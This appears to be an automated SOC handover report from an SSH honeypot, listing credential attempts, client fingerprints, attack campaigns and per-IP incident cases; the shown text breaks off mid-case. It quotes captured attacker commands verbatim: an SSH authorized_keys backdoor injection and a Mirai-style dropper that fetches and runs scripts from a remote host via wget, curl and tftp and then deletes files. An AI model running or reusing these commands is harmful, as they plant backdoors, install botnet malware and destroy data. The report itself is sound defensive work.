# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-24 |
| **Generated At** | 2026-09-24T14:46:14Z |
| **Shift Time** | 14:46 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **148** |
| Confirmed Threats | **111** |
| False Positives Filtered | **37** (25.0%) |
| Unique Attacker IPs | **63** |
| Countries of Origin | **30** |
| High Severity Cases | **59** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **89** |
| Malware Samples Analyzed | **5** HIGH · **22** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **92** |
| Unique Credential Pairs | **42** |
| Unique Usernames | **16** |
| Unique Passwords | **32** |
| Successful Auth Pairs | **68** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 31 |
| `345gs5662d34` | 21 |
| `support` | 12 |
| `admin` | 4 |
| `ubnt` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 21 |
| `3245gs5662d34` | 21 |
| `support` | 12 |
| `1234` | 3 |
| `LeitboGi0ro` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 21 |
| `support` | `support` | 12 |
| `root` | `3245gs5662d34` | 11 |
| `ubnt` | `1234` | 3 |
| `root` | `LeitboGi0ro` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `10.0.0.73` | 2026-09-24T09:14:45 |
| `root` | `2wsx#EDC$RFV` | `163.7.6.114` | 2026-09-24T09:21:11 |
| `345gs5662d34` | `345gs5662d34` | `163.7.6.114` | 2026-09-24T09:21:16 |
| `root` | `3245gs5662d34` | `163.7.6.114` | 2026-09-24T09:21:18 |
| `root` | `sonic` | `103.190.7.203` | 2026-09-24T09:23:53 |
| `345gs5662d34` | `345gs5662d34` | `103.190.7.203` | 2026-09-24T09:23:59 |
| `root` | `3245gs5662d34` | `103.190.7.203` | 2026-09-24T09:24:03 |
| `farid` | `farid` | `103.200.25.79` | 2026-09-24T09:24:28 |
| `345gs5662d34` | `345gs5662d34` | `103.200.25.79` | 2026-09-24T09:24:33 |
| `farid` | `3245gs5662d34` | `103.200.25.79` | 2026-09-24T09:24:35 |
| `root` | `2wsx#EDC$RFV` | `119.28.46.114` | 2026-09-24T09:29:27 |
| `345gs5662d34` | `345gs5662d34` | `119.28.46.114` | 2026-09-24T09:29:31 |
| `root` | `3245gs5662d34` | `119.28.46.114` | 2026-09-24T09:29:33 |
| `raul` | `raul` | `10.0.0.73` | 2026-09-24T09:33:24 |
| `testmail` | `password` | `10.0.0.73` | 2026-09-24T09:37:11 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-24T09:37:14 |
| `testmail` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T09:37:15 |
| `suser` | `123456` | `31.57.47.63` | 2026-09-24T09:45:41 |
| `345gs5662d34` | `345gs5662d34` | `31.57.47.63` | 2026-09-24T09:45:44 |
| `suser` | `3245gs5662d34` | `31.57.47.63` | 2026-09-24T09:45:44 |
| `root` | `openmediavault` | `162.243.147.237` | 2026-09-24T09:52:14 |
| `345gs5662d34` | `345gs5662d34` | `162.243.147.237` | 2026-09-24T09:52:15 |
| `root` | `3245gs5662d34` | `162.243.147.237` | 2026-09-24T09:52:16 |
| `support` | `support` | `176.53.159.196` | 2026-09-24T09:54:43 |
| `admin` | `admin` | `176.65.134.121` | 2026-09-24T10:00:13 |
| `root` | `aA123456.` | `10.0.0.73` | 2026-09-24T10:13:20 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T10:13:26 |
| `root` | `` | `94.154.43.69` | 2026-09-24T10:21:49 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `172.236.127.133` | 2026-09-24T10:30:32 |
| `support` | `support` | `87.103.82.4` | 2026-09-24T10:33:21 |
| `yvonne` | `yvonne` | `10.0.0.73` | 2026-09-24T10:36:14 |
| `yvonne` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T10:36:17 |
| `git` | `root123` | `79.108.220.136` | 2026-09-24T10:39:21 |
| `345gs5662d34` | `345gs5662d34` | `79.108.220.136` | 2026-09-24T10:39:25 |
| `git` | `3245gs5662d34` | `79.108.220.136` | 2026-09-24T10:39:27 |
| `postgres` | `postgres123` | `10.0.0.73` | 2026-09-24T10:43:33 |
| `postgres` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T10:43:39 |
| `root` | `Asdf2024` | `43.134.49.202` | 2026-09-24T10:46:58 |
| `345gs5662d34` | `345gs5662d34` | `43.134.49.202` | 2026-09-24T10:47:03 |
| `root` | `3245gs5662d34` | `43.134.49.202` | 2026-09-24T10:47:04 |
| `root` | `passw0rd` | `31.57.27.21` | 2026-09-24T10:48:45 |
| `345gs5662d34` | `345gs5662d34` | `31.57.27.21` | 2026-09-24T10:48:48 |
| `root` | `3245gs5662d34` | `31.57.27.21` | 2026-09-24T10:48:49 |
| `uno85` | `uno85` | `10.0.0.73` | 2026-09-24T10:51:44 |
| `uno85` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T10:51:48 |
| `root` | `Qwerty#2025` | `10.0.0.73` | 2026-09-24T10:52:30 |
| `admin` | `Password123$` | `10.0.0.73` | 2026-09-24T10:52:45 |
| `admin` | `3245gs5662d34` | `10.0.0.73` | 2026-09-24T10:52:46 |
| `root` | `zz@123456` | `10.0.0.73` | 2026-09-24T10:54:21 |
| `root` | `TempPass123` | `117.50.208.11` | 2026-09-24T11:26:49 |
| `345gs5662d34` | `345gs5662d34` | `117.50.208.11` | 2026-09-24T11:26:53 |
| `root` | `3245gs5662d34` | `117.50.208.11` | 2026-09-24T11:26:56 |
| `xq` | `xq` | `196.49.7.116` | 2026-09-24T11:30:29 |
| `345gs5662d34` | `345gs5662d34` | `196.49.7.116` | 2026-09-24T11:30:32 |
| `xq` | `3245gs5662d34` | `196.49.7.116` | 2026-09-24T11:30:34 |
| `root` | `root123456` | `193.187.110.214` | 2026-09-24T11:39:39 |
| `support` | `support` | `179.255.244.206` | 2026-09-24T12:03:47 |
| `ubnt` | `1234` | `77.90.185.17` | 2026-09-24T12:05:20 |
| `ubnt` | `1234` | `10.0.0.73` | 2026-09-24T12:08:56 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `47.254.195.162` | 2026-09-24T12:20:06 |
| `steam` | `qwerty123` | `223.197.186.7` | 2026-09-24T12:26:31 |
| `345gs5662d34` | `345gs5662d34` | `223.197.186.7` | 2026-09-24T12:26:35 |
| `steam` | `3245gs5662d34` | `223.197.186.7` | 2026-09-24T12:26:37 |
| `root` | `Aa123456!@#` | `81.211.72.167` | 2026-09-24T12:30:20 |
| `345gs5662d34` | `345gs5662d34` | `81.211.72.167` | 2026-09-24T12:30:22 |
| `root` | `3245gs5662d34` | `81.211.72.167` | 2026-09-24T12:30:23 |
| `root` | `123@@@` | `165.1.75.106` | 2026-09-24T12:35:07 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-09-24T12:35:09 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **148** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 41 |
| Go SSH scanner | 6 |
| OpenSSH | 6 |
| Paramiko (Python) | 4 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 40 | 14 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |
| `46a2ae5b447a...` | Mirai/variant | 2 | 2 |
| `390ffe68a68c...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 40 | 14 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 3 | 3 | — |
| `46a2ae5b447a...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `390ffe68a68c...` | OpenSSH | 2 | 1 | Modern SSH client |
| `bc9e7273cde2...` | OpenSSH | 1 | 1 | Mirai/variant |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 13 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1070, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `162.243.147.237`, `81.211.72.167`, `196.49.7.116`, `119.28.46.114`, `163.7.6.114`, `103.200.25.79`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/nokillbins/handshakebins.sh; busybox wget http://213.232.114.14/nokillbins/handshakebins.sh; curl -o handshakebins.sh http://213.232.114.14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114.14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114.14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *
```
Source IPs: `94.154.43.69`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **63** |
| Unique ASNs | **35** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 22 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS264827` | WIRCOM S.P.A. | 2 | LOW |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS4760` | HKT Limited | 2 | HIGH |
| `AS56971` | AS56971 Cloud | 2 | HIGH |
| `AS50401` | LANTRACE LLC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (58)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6b79e34cf694

| Field | Detail |
|---|---|
| **Source IP** | `163.7.6[.]114` |
| **First Seen** | 2026-09-24 09:21 |
| **Last Seen** | 2026-09-24 09:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:21:09` | `cowrie.session.connect` |
| `2026-09-24 09:21:09` | `cowrie.client.version` |
| `2026-09-24 09:21:09` | `cowrie.client.kex` |
| `2026-09-24 09:21:11` | `cowrie.login.success` |
| `2026-09-24 09:21:12` | `cowrie.session.params` |
| `2026-09-24 09:21:12` | `cowrie.command.input` |
| `2026-09-24 09:21:12` | `cowrie.command.failed` |
| `2026-09-24 09:21:12` | `cowrie.log.closed` |
| `2026-09-24 09:21:13` | `cowrie.session.params` |
| `2026-09-24 09:21:13` | `cowrie.command.input` |
| `2026-09-24 09:21:14` | `cowrie.session.file_download` |
| `2026-09-24 09:21:14` | `cowrie.log.closed` |
| `2026-09-24 09:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.6[.]114` to AbuseIPDB if not already reported
- [ ] Block `163.7.6[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-940cd2021f1c

| Field | Detail |
|---|---|
| **Source IP** | `163.7.6[.]114` |
| **First Seen** | 2026-09-24 09:21 |
| **Last Seen** | 2026-09-24 09:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:21:14` | `cowrie.session.connect` |
| `2026-09-24 09:21:14` | `cowrie.client.version` |
| `2026-09-24 09:21:14` | `cowrie.client.kex` |
| `2026-09-24 09:21:16` | `cowrie.login.success` |
| `2026-09-24 09:21:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.6[.]114` to AbuseIPDB if not already reported
- [ ] Block `163.7.6[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b7dc538e52d

| Field | Detail |
|---|---|
| **Source IP** | `163.7.6[.]114` |
| **First Seen** | 2026-09-24 09:21 |
| **Last Seen** | 2026-09-24 09:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:21:16` | `cowrie.session.connect` |
| `2026-09-24 09:21:16` | `cowrie.client.version` |
| `2026-09-24 09:21:16` | `cowrie.client.kex` |
| `2026-09-24 09:21:18` | `cowrie.login.success` |
| `2026-09-24 09:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.6[.]114` to AbuseIPDB if not already reported
- [ ] Block `163.7.6[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3120076c97b

| Field | Detail |
|---|---|
| **Source IP** | `103.190.7[.]203` |
| **First Seen** | 2026-09-24 09:23 |
| **Last Seen** | 2026-09-24 09:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:23:52` | `cowrie.session.connect` |
| `2026-09-24 09:23:52` | `cowrie.client.version` |
| `2026-09-24 09:23:52` | `cowrie.client.kex` |
| `2026-09-24 09:23:53` | `cowrie.login.success` |
| `2026-09-24 09:23:54` | `cowrie.session.params` |
| `2026-09-24 09:23:54` | `cowrie.command.input` |
| `2026-09-24 09:23:54` | `cowrie.command.failed` |
| `2026-09-24 09:23:55` | `cowrie.log.closed` |
| `2026-09-24 09:23:55` | `cowrie.session.params` |
| `2026-09-24 09:23:55` | `cowrie.command.input` |
| `2026-09-24 09:23:55` | `cowrie.session.file_download` |
| `2026-09-24 09:23:55` | `cowrie.log.closed` |
| `2026-09-24 09:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.7[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.190.7[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1220ed428336

| Field | Detail |
|---|---|
| **Source IP** | `103.190.7[.]203` |
| **First Seen** | 2026-09-24 09:23 |
| **Last Seen** | 2026-09-24 09:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:23:57` | `cowrie.session.connect` |
| `2026-09-24 09:23:57` | `cowrie.client.version` |
| `2026-09-24 09:23:58` | `cowrie.client.kex` |
| `2026-09-24 09:23:59` | `cowrie.login.success` |
| `2026-09-24 09:23:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.7[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.190.7[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8825d188f58c

| Field | Detail |
|---|---|
| **Source IP** | `103.190.7[.]203` |
| **First Seen** | 2026-09-24 09:24 |
| **Last Seen** | 2026-09-24 09:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:24:00` | `cowrie.session.connect` |
| `2026-09-24 09:24:00` | `cowrie.client.version` |
| `2026-09-24 09:24:01` | `cowrie.client.kex` |
| `2026-09-24 09:24:03` | `cowrie.login.success` |
| `2026-09-24 09:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.7[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.190.7[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a627ce460525

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-09-24 09:24 |
| **Last Seen** | 2026-09-24 09:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:24:27` | `cowrie.session.connect` |
| `2026-09-24 09:24:27` | `cowrie.client.version` |
| `2026-09-24 09:24:27` | `cowrie.client.kex` |
| `2026-09-24 09:24:28` | `cowrie.login.success` |
| `2026-09-24 09:24:29` | `cowrie.session.params` |
| `2026-09-24 09:24:29` | `cowrie.command.input` |
| `2026-09-24 09:24:29` | `cowrie.command.failed` |
| `2026-09-24 09:24:30` | `cowrie.log.closed` |
| `2026-09-24 09:24:31` | `cowrie.session.params` |
| `2026-09-24 09:24:31` | `cowrie.command.input` |
| `2026-09-24 09:24:31` | `cowrie.session.file_download` |
| `2026-09-24 09:24:31` | `cowrie.log.closed` |
| `2026-09-24 09:24:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9d6c9f0f538

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-09-24 09:24 |
| **Last Seen** | 2026-09-24 09:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:24:31` | `cowrie.session.connect` |
| `2026-09-24 09:24:31` | `cowrie.client.version` |
| `2026-09-24 09:24:31` | `cowrie.client.kex` |
| `2026-09-24 09:24:33` | `cowrie.login.success` |
| `2026-09-24 09:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73380963a3f0

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-09-24 09:24 |
| **Last Seen** | 2026-09-24 09:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:24:34` | `cowrie.session.connect` |
| `2026-09-24 09:24:34` | `cowrie.client.version` |
| `2026-09-24 09:24:34` | `cowrie.client.kex` |
| `2026-09-24 09:24:35` | `cowrie.login.success` |
| `2026-09-24 09:24:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef4bbe2a8426

| Field | Detail |
|---|---|
| **Source IP** | `119.28.46[.]114` |
| **First Seen** | 2026-09-24 09:29 |
| **Last Seen** | 2026-09-24 09:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:29:26` | `cowrie.session.connect` |
| `2026-09-24 09:29:26` | `cowrie.client.version` |
| `2026-09-24 09:29:26` | `cowrie.client.kex` |
| `2026-09-24 09:29:27` | `cowrie.login.success` |
| `2026-09-24 09:29:28` | `cowrie.session.params` |
| `2026-09-24 09:29:28` | `cowrie.command.input` |
| `2026-09-24 09:29:28` | `cowrie.command.failed` |
| `2026-09-24 09:29:29` | `cowrie.log.closed` |
| `2026-09-24 09:29:29` | `cowrie.session.params` |
| `2026-09-24 09:29:29` | `cowrie.command.input` |
| `2026-09-24 09:29:30` | `cowrie.session.file_download` |
| `2026-09-24 09:29:30` | `cowrie.log.closed` |
| `2026-09-24 09:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.28.46[.]114` to AbuseIPDB if not already reported
- [ ] Block `119.28.46[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b225c6fc738d

| Field | Detail |
|---|---|
| **Source IP** | `119.28.46[.]114` |
| **First Seen** | 2026-09-24 09:29 |
| **Last Seen** | 2026-09-24 09:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:29:30` | `cowrie.session.connect` |
| `2026-09-24 09:29:30` | `cowrie.client.version` |
| `2026-09-24 09:29:30` | `cowrie.client.kex` |
| `2026-09-24 09:29:31` | `cowrie.login.success` |
| `2026-09-24 09:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.28.46[.]114` to AbuseIPDB if not already reported
- [ ] Block `119.28.46[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd15edd45684

| Field | Detail |
|---|---|
| **Source IP** | `119.28.46[.]114` |
| **First Seen** | 2026-09-24 09:29 |
| **Last Seen** | 2026-09-24 09:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 09:29:31` | `cowrie.session.connect` |
| `2026-09-24 09:29:31` | `cowrie.client.version` |
| `2026-09-24 09:29:32` | `cowrie.client.kex` |
| `2026-09-24 09:29:33` | `cowrie.login.success` |
| `2026-09-24 09:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.28.46[.]114` to AbuseIPDB if not already reported
- [ ] Block `119.28.46[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b525e4aa6d80

| Field | Detail |
|---|---|
| **Source IP** | `31.57.47[.]63` |
| **First Seen** | 2026-09-24 09:45 |
| **Last Seen** | 2026-09-24 09:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
